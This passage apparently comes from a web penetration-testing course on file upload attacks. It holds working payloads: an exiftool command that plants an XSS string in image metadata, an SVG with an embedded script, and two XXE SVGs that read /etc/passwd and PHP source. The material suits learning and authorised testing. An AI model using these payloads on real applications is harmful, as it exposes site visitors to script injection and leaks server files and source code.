Certain file types, like `SVG`, `HTML`, `XML`, and even some image and document files, may allow us to introduce new vulnerabilities to the web application by uploading malicious versions of these files. This is why fuzzing allowed file extensions is an important exercise for any file upload attack. It enables us to explore what attacks may be achievable on the web server.

## XSS
Many file types may allow us to introduce a `Stored XSS` vulnerability to the web application by uploading maliciously crafted versions of them.
The most basic example is when a web application allows us to upload `HTML` files. Although HTML files won't allow us to execute code (e.g., PHP), it would still be possible to implement JavaScript code within them to carry an XSS or CSRF attack on whoever visits the uploaded HTML page. If the target sees a link from a website they trust, and the website is vulnerable to uploading HTML documents, it may be possible to trick them into visiting the link and carry the attack on their machines.
```shell-session
$ exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
$ exiftool HTB.jpg
...SNIP...
Comment                         :  "><img src=1 onerror=alert(window.origin)>
```
We can see that the `Comment` parameter was updated to our XSS payload. When the image's metadata is displayed, the XSS payload should be triggered, and the JavaScript code will be executed to carry the XSS attack. Furthermore, if we change the image's MIME-Type to `text/html`, some web applications may show it as an HTML document instead of an image, in which case the XSS payload would be triggered even if the metadata wasn't directly displayed.
Finally, XSS attacks can also be carried with `SVG` images, along with several other attacks.
For example, we can write the following to `HTB.svg`:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

## XXE
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```
